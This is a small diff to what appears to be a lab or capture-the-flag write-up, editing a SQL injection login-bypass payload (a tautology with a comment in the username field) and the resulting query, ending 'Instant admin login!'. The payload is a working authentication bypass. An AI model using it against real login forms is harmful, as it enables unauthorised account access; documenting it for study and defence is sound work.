@@ -13,7 +13,7 @@
 The site greets us with a simple login form.
 
 **Payload**  
-`Username:` `' OR 1=1 --`  
+`Username:` `' OR 1=1--`  
 `Password:` anything
 
 **Explanation**  
@@ -23,7 +23,7 @@ The site greets us with a simple login form.
 
 **Resulting SQL query**  
 ```sql
-SELECT * FROM users WHERE username = '' OR 1=1 -- ' AND password = '...';
+SELECT * FROM users WHERE username = '' OR 1=1-- ' AND password = '...';
 ```
 → Instant admin login!
 SQLi bypass
